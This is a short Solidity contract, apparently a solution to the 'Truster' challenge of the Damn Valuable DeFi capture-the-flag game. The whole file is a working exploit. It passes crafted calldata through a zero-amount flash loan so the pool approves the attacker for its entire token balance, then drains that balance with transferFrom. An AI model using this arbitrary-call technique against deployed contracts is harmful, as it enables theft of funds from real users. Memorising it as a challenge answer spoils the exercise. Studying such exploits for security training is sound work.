// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./TrusterLenderPool.sol";

contract AttackTrusterPool {
    TrusterLenderPool pool;

    DamnValuableToken token;

    constructor(address _pool) {
        pool = TrusterLenderPool(_pool);

        token = pool.token();
    }

    function attack() external {
        bytes memory data = _encodeApprove(address(this), type(uint256).max);

        //  user target.functionCall(data)
        //  pool execute `token.approve(address,uint256)`

        pool.flashLoan(0, msg.sender, address(token), data);

        token.transferFrom(
            address(pool),
            msg.sender,
            token.balanceOf(address(pool))
        );
    }

    function _encodeApprove(
        address to,
        uint amount
    ) internal pure returns (bytes memory) {
        return abi.encodeWithSignature("approve(address,uint256)", to, amount);
    }
}
